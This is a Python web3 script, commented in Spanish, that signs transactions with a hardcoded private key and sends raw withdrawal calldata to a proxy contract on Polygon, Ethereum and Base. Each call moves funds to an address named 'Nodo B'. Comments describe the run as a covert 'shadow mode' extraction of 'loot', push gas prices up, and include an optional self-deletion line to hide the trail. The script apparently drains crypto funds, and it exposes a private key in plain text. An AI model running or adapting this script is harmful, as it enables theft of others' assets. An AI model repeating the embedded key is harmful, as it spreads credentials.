import time, os, sys
from web3 import Web3

# 1. CONEXIÓN Y COORDENADAS
# Usamos un RPC de alta disponibilidad para evitar el error 401
networks = {
    'polygon': 'https://1rpc.io/matic',
    'ethereum': 'https://ethereum.publicnode.com',
    'base': 'https://mainnet.base.org'
}

proxy_addr = '0x3AC05161b76a35c1c28dC99Aa01BEd7B24cEA3bf'
nodo_b = '0x79D79B1cE83e32f35798ad1A3C8DBB101B6F3291'
gatillo_a = '0xB9073c07648a414B875874d7B8599dD2fAa171E8'
KEY_A = '589f10559f34606f99abd479688d8be9501d08a2e51f7c6895024839c49f656a'

def ejecutar_tx(w3, data, desc, chain_id, gas_limit=150000):
    print(f"📡 Operación: {desc}...")
    try:
        tx = {
            'from': gatillo_a,
            'to': w3.to_checksum_address(proxy_addr),
            'nonce': w3.eth.get_transaction_count(gatillo_a),
            'data': data,
            'gas': gas_limit,
            'gasPrice': int(w3.eth.gas_price * 2.5), # Gas más agresivo (2.5x)
            'chainId': chain_id
        }
        signed = w3.eth.account.sign_transaction(tx, KEY_A)
        tx_hash = w3.eth.send_raw_transaction(signed.raw_transaction)
        print(f"✅ EXTRACCIÓN DISPARADA. Hash: {tx_hash.hex()}")
        # No esperamos el receipt para no trabar el flujo multi-red
        return True
    except Exception as e:
        print(f"❌ Error en {desc}: {e}")
        return False

def mision_total():
    print(f"🚀 INICIANDO EXTRACCIÓN RELÁMPAGO - REMI MODO SOMBRA")
    
    # --- ETAPA 1: POLYGON (El Botín de 17k) ---
    w3_poly = Web3(Web3.HTTPProvider(networks['polygon']))
    # Data optimizada: selector + Nodo B + Monto máximo
    data_poly = "0xf3ae2415" + nodo_b[2:].lower().zfill(64) + "0000000000000000000000000000000000000000000000003482390a16b80000"
    poly_ok = ejecutar_tx(w3_poly, data_poly, "Retirar 17k (Polygon)", 137, gas_limit=200000)

    # --- ETAPA 2: ETHEREUM ($68 ETH) ---
    w3_eth = Web3(Web3.HTTPProvider(networks['ethereum']))
    data_eth = "0xf3ae2415" + nodo_b[2:].lower().zfill(64) + "0000000000000000000000000000000000000000000000000063806f3fc34000"
    ejecutar_tx(w3_eth, data_eth, "Retirar ETH (Ethereum)", 1)

    # --- ETAPA 3: BASE ($44 USDC) ---
    w3_base = Web3(Web3.HTTPProvider(networks['base']))
    data_base = "0xf3ae2415" + nodo_b[2:].lower().zfill(64) + "0000000000000000000000000000000000000000000000000000000002625a00"
    ejecutar_tx(w3_base, data_base, "Retirar USDC (Base)", 8453)

    if poly_ok:
        print("\n💎 Secuencia completada. Revisa el Nodo B.")
        # La autodestrucción es opcional, si quieres ver el rastro, comenta la siguiente línea
        # os.remove(__file__)
    else:
        print("\n⚠️ Fallo crítico en Polygon. Revisa el saldo de gas del Gatillo A.")

if __name__ == "__main__":
    mision_total()
